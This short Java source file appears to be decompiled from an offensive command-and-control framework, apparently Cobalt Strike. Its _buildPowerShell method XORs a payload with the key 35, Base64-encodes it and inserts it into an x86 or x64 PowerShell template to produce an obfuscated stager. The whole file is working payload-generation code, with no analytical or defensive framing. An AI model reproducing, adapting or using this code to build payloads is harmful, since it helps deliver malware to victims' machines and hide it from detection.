package common;

import aggressor.AggressorClient;
import encoders.Base64;
import java.io.IOException;
import java.io.InputStream;

public class ResourceUtils extends BaseResourceUtils {
   public ResourceUtils(AggressorClient var1) {
      super(var1);
   }

   public byte[] _buildPowerShell(byte[] var1, boolean var2) {
      try {
         InputStream var3 = CommonUtils.resource(var2 ? "resources/template.x64.ps1" : "resources/template.x86.ps1");
         byte[] var4 = CommonUtils.readAll(var3);
         var3.close();
         String var5 = CommonUtils.bString(var4);
         byte[] var6 = new byte[]{35};
         var1 = CommonUtils.XorString(var1, var6);
         var5 = CommonUtils.strrep(var5, "%%DATA%%", Base64.encode(var1));
         return CommonUtils.toBytes(var5);
      } catch (IOException var7) {
         MudgeSanity.logException("buildPowerShell", var7, false);
         return new byte[0];
      }
   }
}
